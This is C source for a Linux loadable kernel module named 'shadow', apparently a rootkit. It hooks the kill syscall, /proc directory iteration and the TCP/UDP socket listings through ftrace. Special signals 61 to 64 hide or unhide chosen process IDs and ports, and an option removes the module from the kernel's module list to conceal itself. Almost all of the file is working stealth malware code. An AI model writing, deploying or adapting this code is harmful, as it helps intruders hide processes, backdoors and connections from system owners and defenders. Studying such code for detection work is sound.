#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/dirent.h>
#include <linux/string.h>
#include <linux/file.h>
#include <linux/tcp.h>
#include <linux/udp.h>
#include <linux/netdevice.h>
#include <linux/inet_diag.h>
#include <linux/seq_file.h>
#include <linux/ctype.h>
#include <linux/signal.h>
#include <net/tcp.h>
#include <net/udp.h>
#include "shadow.h"

#define MAX_HIDDEN_PIDS 16
#define MAX_HIDDEN_PORTS 16
#define PID_LEN 16

/* 
隐藏进程：sudo kill -61 <PID>
取消隐藏进程：sudo kill -62 <PID>
隐藏端口：sudo kill -63 <PORT>
取消隐藏端口：sudo kill -64 <PORT>
 */

#define SIG_HIDE_PID 61
#define SIG_UNHIDE_PID 62
#define SIG_HIDE_PORT 63
#define SIG_UNHIDE_PORT 64

static char hide_pids[MAX_HIDDEN_PIDS][PID_LEN];
static int hide_pids_count = 0;
static u16 hide_ports[MAX_HIDDEN_PORTS];
static int hide_ports_count = 0;
static int self_hide = 0;

module_param(self_hide, int, 0644);

/* --- Signal Hijacking Logic --- */

static int (*real_kill)(pid_t pid, int sig);

static int fake_kill(pid_t pid, int sig)
{
    int i, j;
    char pid_str[PID_LEN];

    switch (sig) {
        case SIG_HIDE_PID:
            if (hide_pids_count >= MAX_HIDDEN_PIDS) return -ENOSPC;
            snprintf(pid_str, PID_LEN, "%d", pid);
            /* Check if already hidden */
            for (i = 0; i < hide_pids_count; i++) {
                if (strcmp(hide_pids[i], pid_str) == 0) return 0;
            }
            strncpy(hide_pids[hide_pids_count], pid_str, PID_LEN);
            hide_pids_count++;
            pr_info("shadow: Hidden PID %d\n", pid);
            return 0;

        case SIG_UNHIDE_PID:
            snprintf(pid_str, PID_LEN, "%d", pid);
            for (i = 0; i < hide_pids_count; i++) {
                if (strcmp(hide_pids[i], pid_str) == 0) {
                    /* Shift remaining elements */
                    for (j = i; j < hide_pids_count - 1; j++) {
                        strncpy(hide_pids[j], hide_pids[j+1], PID_LEN);
                    }
                    hide_pids_count--;
                    pr_info("shadow: Unhidden PID %d\n", pid);
                    return 0;
                }
            }
            return 0;

        case SIG_HIDE_PORT:
            if (hide_ports_count >= MAX_HIDDEN_PORTS) return -ENOSPC;
            /* Check if already hidden */
            for (i = 0; i < hide_ports_count; i++) {
                if (hide_ports[i] == (u16)pid) return 0;
            }
            hide_ports[hide_ports_count] = (u16)pid;
            hide_ports_count++;
            pr_info("shadow: Hidden port %d\n", pid);
            return 0;

        case SIG_UNHIDE_PORT:
            for (i = 0; i < hide_ports_count; i++) {
                if (hide_ports[i] == (u16)pid) {
                    /* Shift remaining elements */
                    for (j = i; j < hide_ports_count - 1; j++) {
                        hide_ports[j] = hide_ports[j+1];
                    }
                    hide_ports_count--;
                    pr_info("shadow: Unhidden port %d\n", pid);
                    return 0;
                }
            }
            return 0;
    }

    return real_kill(pid, sig);
}

/* --- Process Hiding Logic --- */

#if LINUX_VERSION_CODE >= KERNEL_VERSION(6, 1, 0)
typedef bool (*filldir_t)(struct dir_context *, const char *, int, loff_t, u64, unsigned int);
#else
typedef int (*filldir_t)(struct dir_context *, const char *, int, loff_t, u64, unsigned int);
#endif

static int (*real_iterate_shared)(struct file *, struct dir_context *);
static int (*real_iterate_dir)(struct file *, struct dir_context *);

struct stealth_dir_context {
    struct dir_context ctx;
    struct dir_context *orig_ctx;
    filldir_t orig_actor;
    bool is_proc;
};

#if LINUX_VERSION_CODE >= KERNEL_VERSION(6, 1, 0)
static bool stealth_actor(struct dir_context *ctx, const char *name, int len,
                         loff_t offset, u64 ino, unsigned int d_type)
#else
static int stealth_actor(struct dir_context *ctx, const char *name, int len,
                        loff_t offset, u64 ino, unsigned int d_type)
#endif
{
    struct stealth_dir_context *s_ctx = container_of(ctx, struct stealth_dir_context, ctx);
    int i;

    if (s_ctx->is_proc && len > 0 && isdigit(name[0])) {
        for (i = 0; i < hide_pids_count; i++) {
            if (len == strlen(hide_pids[i]) && strncmp(name, hide_pids[i], len) == 0)
                return true; 
        }
    }

    s_ctx->orig_ctx->pos = ctx->pos;
    return s_ctx->orig_actor(s_ctx->orig_ctx, name, len, offset, ino, d_type);
}

static int fake_iterate_common(struct file *file, struct dir_context *ctx, 
                               int (*real_func)(struct file *, struct dir_context *))
{
    int ret;
    struct stealth_dir_context s_ctx = {
        .ctx.actor = stealth_actor,
        .orig_ctx = ctx,
        .orig_actor = ctx->actor,
        .is_proc = false,
    };

    if (file && file->f_path.dentry && file->f_path.dentry->d_sb) {
        const char *fs_name = file->f_path.dentry->d_sb->s_type->name;
        if (strcmp(fs_name, "proc") == 0) {
            s_ctx.is_proc = true;
        }
    }

    if (!s_ctx.is_proc) {
        return real_func(file, ctx);
    }

    s_ctx.ctx.pos = ctx->pos;
    ret = real_func(file, &s_ctx.ctx);
    ctx->pos = s_ctx.ctx.pos;
    return ret;
}

static int fake_iterate_shared(struct file *file, struct dir_context *ctx)
{
    return fake_iterate_common(file, ctx, real_iterate_shared);
}

static int fake_iterate_dir(struct file *file, struct dir_context *ctx)
{
    return fake_iterate_common(file, ctx, real_iterate_dir);
}

/* --- Network Hiding Logic --- */

static int (*real_tcp4_seq_show)(struct seq_file *seq, void *v);
static int (*real_udp4_seq_show)(struct seq_file *seq, void *v);

static int fake_tcp4_seq_show(struct seq_file *seq, void *v)
{
    struct sock *sk = v;
    int i;

    if (v == SEQ_START_TOKEN)
        return real_tcp4_seq_show(seq, v);

    for (i = 0; i < hide_ports_count; i++) {
        if (sk->sk_num == hide_ports[i])
            return 0;
    }

    return real_tcp4_seq_show(seq, v);
}

static int fake_udp4_seq_show(struct seq_file *seq, void *v)
{
    struct sock *sk = v;
    int i;

    if (v == SEQ_START_TOKEN)
        return real_udp4_seq_show(seq, v);

    for (i = 0; i < hide_ports_count; i++) {
        if (sk->sk_num == hide_ports[i])
            return 0;
    }

    return real_udp4_seq_show(seq, v);
}

/* --- Module Self-Hiding --- */

static struct list_head *prev_module = NULL;

static void hide_module(void)
{
    if (prev_module) return;
    prev_module = THIS_MODULE->list.prev;
    list_del(&THIS_MODULE->list);
}

static void show_module(void)
{
    if (!prev_module) return;
    list_add(&THIS_MODULE->list, prev_module);
    prev_module = NULL;
}

/* --- Module Setup --- */

static struct ftrace_hook hooks[] = {
    { .name = "iterate_shared", .function = fake_iterate_shared, .original = &real_iterate_shared },
    { .name = "iterate_dir", .function = fake_iterate_dir, .original = &real_iterate_dir },
    { .name = "tcp4_seq_show", .function = fake_tcp4_seq_show, .original = &real_tcp4_seq_show },
    { .name = "udp4_seq_show", .function = fake_udp4_seq_show, .original = &real_udp4_seq_show },
    { .name = "__x64_sys_kill", .function = fake_kill, .original = &real_kill },
};

static struct ftrace_hook arm_hooks[] = {
    { .name = "__arm64_sys_kill", .function = fake_kill, .original = &real_kill },
};

static int __init shadow_init(void)
{
    int err;

    err = resolve_ftrace_functions();
    if (err) return err;

    err = fh_install_hooks(hooks, ARRAY_SIZE(hooks));
    if (err) {
        err = fh_install_hooks(arm_hooks, ARRAY_SIZE(arm_hooks));
        if (err) {
            pr_err("shadow: Failed to install hooks\n");
            return err;
        }
    }
    
    if (self_hide) {
        hide_module();
        pr_info("shadow: Loaded in HIDDEN mode.\n");
    } else {
        pr_info("shadow: Loaded in VISIBLE mode.\n");
    }
    
    return 0;
}

static void __exit shadow_exit(void)
{
    if (self_hide) {
        show_module();
    }

    fh_remove_hooks(hooks, ARRAY_SIZE(hooks));
    fh_remove_hooks(arm_hooks, ARRAY_SIZE(arm_hooks));
    
    pr_info("shadow: Unloaded\n");
}

module_init(shadow_init);
module_exit(shadow_exit);
MODULE_LICENSE("GPL");
MODULE_AUTHOR("test");
MODULE_DESCRIPTION("LKM shadow for hiding processes and network connections via signal hijacking");